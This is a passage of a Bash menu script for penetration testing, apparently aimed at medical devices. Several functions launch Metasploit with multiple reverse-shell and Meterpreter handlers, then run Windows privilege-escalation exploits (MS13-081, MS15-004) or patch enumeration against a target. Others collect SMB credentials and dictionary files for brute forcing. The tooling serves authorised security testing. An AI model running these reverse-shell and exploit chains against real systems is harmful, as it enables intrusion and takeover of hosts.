	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j"-x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 3" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "set payload generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 443" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 4" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "use exploit/windows/local/ms13_081_track_popup_menu" -x "set SESSION 1" -x "exploit" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t048 {
	echo "048 - Check if device has MS15-004 vulnerability by performing patches enumeration"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j"-x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 3" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "set payload generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 443" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 4" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "use post/windows/gather/enum_patches" -x "set KB 3020388,3020387,3019978" -x "set SESSION 1" -x "run" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t049 {
	echo "049 - Check if device has MS15-004 vulnerability by performing remote desktop service attack"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j"-x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 3" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "set payload generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 443" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 4" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "use exploit/windows/local/ms15_004_tswbproxy" -x "set LHOST $testerIP" -x "set PAYLOAD windows/meterpreter/reverse_tcp" -x "set SESSION 1" -x "exploit" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t050 {
	echo "050 - Check if device has MS14-060 Sandworm vulnerability"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo -e "Tester's IP address: "
	read testerIP
	echo
	echo -e "Target's IP address: "
	read targetIP
	ipT-ip
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "use exploit/multi/handler" -x "set payload windows/meterpreter/reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 4444" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 1" -x "set VERBOSE true" -x "exploit -j"-x "set payload windows/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 80" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set ExitOnSession false" -x "set SESSION 2" -x "set VERBOSE true" -x "exploit -j" -x "set payload windows/x64/meterpreter_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 2121" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 3" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "set payload generic/shell_reverse_tcp" -x "set LHOST $testerIP" -x "set LPORT 443" -x "set RHOST $targetIP" -x "set RPORT 445" -x "set SESSION 4" -x "set ExitOnSession false" -x "set VERBOSE true" -x "exploit -j" -x "back" -x "use post/windows/gather/enum_patches" -x "set KB 38000869" -x "run" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function t051 {
	echo "051 - Kill running jobs"
	echo "-----------------------------------------------------------------------------------------------------------"
	echo	
	echo "Starting Metasploit . . ."
	echo
	service postgresql start
	msfconsole -q -x "kill 0,1,2,3" -x "jobs" -x "exit"
	echo
	echo "-----------------------------------------------------------------------------------------------------------"
	taskMenu
}
function ip-mac {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Target's IP address: $targetIP"
	echo "[2] Target's MAC address: $targetMAC"
	echo -e "Enter [Y] to proceed, OR [1/2] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ip-mac ;;
		2)
			echo
			echo -e "Target's MAC address: "
			read targetMAC
			ip-mac ;;
		*)
			echo
			echo "Invalid input."
			ip-mac
	esac
	echo
}
function ip-smbU {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Target's IP address: $targetIP"
	echo "[2] Target's SMB username: $smbUser"
	echo -e "Enter [Y] to proceed, OR [1/2] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ip-smbU ;;
		2)
			echo
			echo -e "Target's SMB Domain: "
			read smbUser
			ip-smbU ;;
		*)
			echo
			echo "Invalid input."
			ip-smbU
	esac
	echo
}
function ip-smbD {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Target's IP address: $targetIP"
	echo "[2] Target's SMB domain: $smbDomain"
	echo -e "Enter [Y] to proceed, OR [1/2] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ip-smbD ;;
		2)
			echo
			echo -e "Target's SMB Domain: "
			read smbDomain
			ip-smbD ;;
		*)
			echo
			echo "Invalid input."
			ip-smbD
	esac
	echo
}
function ip-users-pass {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Target's IP address: $targetIP"
	echo "[2] Target's usernames dictionary file directory: $userFile"
	echo "[3] Target's password dictionary file directory: $passFile"
	echo -e "Enter [Y] to proceed, OR [1/2/3] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ip-users-pass ;;
		2)
			echo
			echo -e "Target's usernames dictionary file directory: "
			read userFile
			ip-users-pass ;;
		3)
			echo
			echo -e "Target's password dictionary file directory: "
			read passFile
			ip-users-pass ;;
		*)
			echo
			echo "Invalid input."
			ip-users-pass
	esac
	echo
}
function ip-smbD-smbU-users-pass {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Target's IP address: $targetIP"
	echo "[2] Target's SMB domain: $smbDomain"
	echo "[3] Target's SMB username: $smbUser"
	echo "[4] Target's usernames dictionary file directory: $userFile"
	echo "[5] Target's password dictionary file directory: $passFile"
	echo -e "Enter [Y] to proceed, OR [e.g. 3] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ip-smbD-smbU-users-pass ;;
		2)
			echo
			echo -e "Target's SMB Domain: "
			read smbDomain
			ip-smbD-smbU-users-pass ;;
		3)
			echo
			echo -e "Target's SMB username: "
			read smbUser
			ip-smbD-smbU-users-pass ;;
		4)
			echo
			echo -e "Target's usernames dictionary file directory: "
			read userFile
			ip-smbD-smbU-users-pass ;;
		5)
			echo
			echo -e "Target's password dictionary file directory: "
			read passFile
			ip-smbD-smbU-users-pass ;;
		*)
			echo
			echo "Invalid input."
			ip-smbD-smbU-users-pass
	esac
	echo
}
function ipT-ip-share-smbD-smbU {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Tester's IP address: $testerIP"
	echo "[2] Target's IP address: $targetIP"
	echo "[3] Target's SHARE file name: $share"
	echo "[4] Target's SMB domain: $smbDomain"
	echo "[5] Target's SMB username: $smbUser"
	echo -e "Enter [Y] to proceed, OR [e.g. 3] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Tester's IP address: "
			read testerIP
			ipT-ip-share-smbD-smbU ;;
		2)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ipT-ip-share-smbD-smbU ;;
		3)
			echo
			echo -e "Target's SHARE file name: "
			read share
			ipT-ip-share-smbD-smbU ;;
		4)
			echo
			echo -e "Target's SMB Domain: "
			read smbDomain
			ipT-ip-share-smbD-smbU ;;
		5)
			echo
			echo -e "Target's SMB username: "
			read smbUser
			ipT-ip-share-smbD-smbU ;;
		*)
			echo
			echo "Invalid input."
			ipT-ip-share-smbD-smbU
	esac
	echo
}
function ipT-ip-share {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Tester's IP address: $testerIP"
	echo "[2] Target's IP address: $targetIP"
	echo "[3] Target's SHARE file name: $share"
	echo -e "Enter [Y] to proceed, OR [e.g. 3] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Tester's IP address: "
			read testerIP
			ipT-ip-share ;;
		2)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ipT-ip-share ;;
		3)
			echo
			echo -e "Target's SHARE file name: "
			read share
			ipT-ip-share ;;
		*)
			echo
			echo "Invalid input."
			ipT-ip-share
	esac
	echo
}
function ip-pshare-smbV-os-smbU-smbD {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Target's IP address: $targetIP"
	echo "[2] Printer Share name: $printerName"
	echo "[3] Target's SMB version: $smbVersion"
	echo "[4] Target's operating system: $targetOS"
	echo "[5] Target's SMB username: $smbUser"
	echo "[6] Target's SMB domain: $smbDomain"
	echo -e "Enter [Y] to proceed, OR [e.g. 3] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ip-pshare-smbV-os-smbU-smbD ;;
		2)
			echo
			echo -e "Printer Share name: "
			read printerName
			ip-pshare-smbV-os-smbU-smbD ;;
		3)
			echo
			echo -e "Target's SMB version: "
			read smbVersion
			ip-pshare-smbV-os-smbU-smbD ;;
		4)
			echo
			echo -e "Target's operating system: "
			read targetOS
			ip-pshare-smbV-os-smbU-smbD ;;
		5)
			echo
			echo -e "Target's SMB username: "
			read smbUser
			ip-pshare-smbV-os-smbU-smbD ;;
		6)
			echo
			echo -e "Target's SMB domain: "
			read smbDomain
			ip-pshare-smbV-os-smbU-smbD ;;
		*)
			echo
			echo "Invalid input."
			ip-pshare-smbV-os-smbU-smbD
	esac
	echo
}
function ipT-ip-smbV-os-smbU-smbD {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Tester's IP address: $testerIP"
	echo "[2] Target's IP address: $targetIP"
	echo "[3] Target's SMB version: $smbVersion"
	echo "[4] Target's operating system: $targetOS"
	echo "[5] Target's SMB username: $smbUser"
	echo "[6] Target's SMB domain: $smbDomain"
	echo -e "Enter [Y] to proceed, OR [e.g. 3] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Tester's IP address: "
			read testerIP
			ipT-ip-smbV-os-smbU-smbD ;;
			
		2)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ipT-ip-smbV-os-smbU-smbD ;;
		3)
			echo
			echo -e "Target's SMB version: "
			read smbVersion
			ipT-ip-smbV-os-smbU-smbD ;;
		4)
			echo
			echo -e "Target's operating system: "
			read targetOS
			ipT-ip-smbV-os-smbU-smbD ;;
		5)
			echo
			echo -e "Target's SMB username: "
			read smbUser
			ipT-ip-smbV-os-smbU-smbD ;;
		6)
			echo
			echo -e "Target's SMB domain: "
			read smbDomain
			ipT-ip-smbV-os-smbU-smbD ;;
		*)
			echo
			echo "Invalid input."
			ipT-ip-smbV-os-smbU-smbD
	esac
	echo
}
function ipT-ip {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Tester's IP address: $testerIP"
	echo "[2] Target's IP address: $targetIP"
	echo -e "Enter [Y] to proceed, OR [1/2] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Tester's IP address: "
			read testerIP
			ipT-ip ;;
			
		2)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ipT-ip ;;
		*)
			echo
			echo "Invalid input."
			ipT-ip
	esac
	echo
}
function ip-smbU-smbD-users-pass {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Target's IP address: $targetIP"
	echo "[2] Target's SMB username: $smbUser"
	echo "[3] Target's SMB domain: $smbDomain"
	echo "[4] Target's username dictionary file directory: $userFile"
	echo "[5] Target's passwords dictionary file directory: $passFile"
	echo -e "Enter [Y] to proceed, OR [e.g. 2] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ip-smbU-smbD-users-pass ;;
		2)
			echo
			echo -e "Target's SMB username: "
			read smbUser
			ip-smbU-smbD-users-pass ;;
		3)
			echo
			echo -e "Target's SMB domain: "
			read smbDomain
			ip-smbU-smbD-users-pass ;;
		4)
			echo
			echo -e "Target's usernames dictionary file directory: "
			read userFile
			ip-smbU-smbD-users-pass ;;
		5)
			echo
			echo -e "Target's passwords dictionary file directory: "
			read passFile
			ip-smbU-smbD-users-pass ;;
		*)
			echo
			echo "Invalid input."
			ip-smbU-smbD-users-pass
	esac
	echo
}
function ipT-ip-os-share-smbU-smbD-smbV-pshare {
	echo "-----------------------------------------------------------------------------------------------------------"
	echo "Is this information correct?"
	echo "[1] Tester's IP address: $testerIP"
	echo "[2] Target's IP address: $targetIP"
	echo "[3] Target's operating system: $targetOS"
	echo "[4] Target's SHARE file name: $share"
	echo "[5] Target's SMB username: $smbUser"
	echo "[6] Target's SMB domain: $smbDomain"
	echo "[7] Target's SMB version: $smbVersion"
	echo "[8] Printer Share name: $printerName"
	echo -e "Enter [Y] to proceed, OR [e.g. 2] to fix specific entry: "
	read infoCorrect
	case $infoCorrect in
		Y)
			echo ;;
		0)
			exit ;;
		1)
			echo
			echo -e "Tester's IP address: "
			read testerIP
			ipT-ip-os-share-smbU-smbD-smbV-pshare ;;
		2)
			echo
			echo -e "Target's IP address: "
			read targetIP
			ipT-ip-os-share-smbU-smbD-smbV-pshare ;;
		3)
			echo
			echo -e "Target's operating system: "
			read targetOS
			ipT-ip-os-share-smbU-smbD-smbV-pshare ;;
		4)
			echo
			echo -e "Target's SHARE file name: "
			read share
			ipT-ip-os-share-smbU-smbD-smbV-pshare ;;
		5)
			echo
			echo -e "Target's SMB username: "
			read smbUser
			ipT-ip-os-share-smbU-smbD-smbV-pshare ;;
		6)
			echo
			echo -e "Target's SMB domain: "
			read smbDomain
			ipT-ip-os-share-smbU-smbD-smbV-pshare ;;
		7)
			echo
			echo -e "Target's SMB version: "
			read smbVersion
			ipT-ip-os-share-smbU-smbD-smbV-pshare ;;
		8)
			echo
			echo -e "Printer Share name: "
			read printerName
			ipT-ip-os-share-smbU-smbD-smbV-pshare ;;
		*)
			echo
			echo "Invalid input."
			ipT-ip-os-share-smbU-smbD-smbV-pshare
	esac
	echo
}
function defaultUser {
	echo -e "Use default usernames dictionary? [Y/N]"
	read yesNo
		case $yesNo in
			Y)
				userFile="/usr/Documents/OSSEC-MedDevice-PenTest/dictionaries/users_table.txt"
				echo "Default usernames dictionary is used.";;
			N)
				echo "Input format: /directory/filename.extension | e.g. /root/Desktop/users_table.txt"
				echo -e "Usernames dictionary file directory: "
				read userFile
				echo "Usernames dictionary is set to " $userFile ;;
			*)
				clear
				echo "Invalid input."
				echo
				defaultUser;;
		esac
}
function defaultPass {
	echo -e "Use default passwords dictionary? [Y/N]"
	read yesNo
		case $yesNo in
			Y)
				passFile="/usr/Documents/OSSEC-MedDevice-PenTest/dictionaries/pass_table.txt"
				echo "Default passwords dictionary is used.";;
			N)
				echo "Input format: /directory/filename.extension | e.g. /root/Desktop/pass_table.txt"
				echo -e "Usernames dictionary file directory: "
				read passFile
				echo "Passwords dictionary is set to " $passFile ;;
			*)
				clear
				echo "Invalid input."
				echo
				defaultPass;;
		esac
}
function defaultFuzzer {
	echo -e "Use default fuzzer script? [Y/N] "
	read yesNo
	case $yesNo in
			Y)
				fuzzer
				echo "Default fuzzer script is used." ;;
			N)
				echo "Input format: /directory/filename.extension | e.g. /root/Desktop/fuzzScript.cfg"
				echo -e "Fuzzer script file directory: "
				read fuzzScript
				echo "Fuzzer script is set to " $fuzzScript ;;
			*)
				clear
				echo "Invalid input."
				echo
				defaultFuzzer;;
		esac
}
function dateStamp {
	echo "------------------------------------------------------"
	echo
	echo "Version 1.0.1"
	echo "Last updated: 06/28/2019"
	##today="date '+%x %X'"
	##echo "Current time: "./date '+%x %X'
	echo
	echo "------------------------------------------------------"
	echo
}
function headerASCII {
	echo
	echo " ____  _____ _____ ______ _____ "
	echo "/ __ \ / ____/ ____| ____/ ____|"
	echo "| | | | (___| (___ | |__ | | "
	echo "| | | |\___ \\___ \|  __|| | "
	echo "| |_| |____) |___) | |___| |____"
	echo "\____/|_____/_____/|______\_____|"
}
headerASCII
mode
clearr
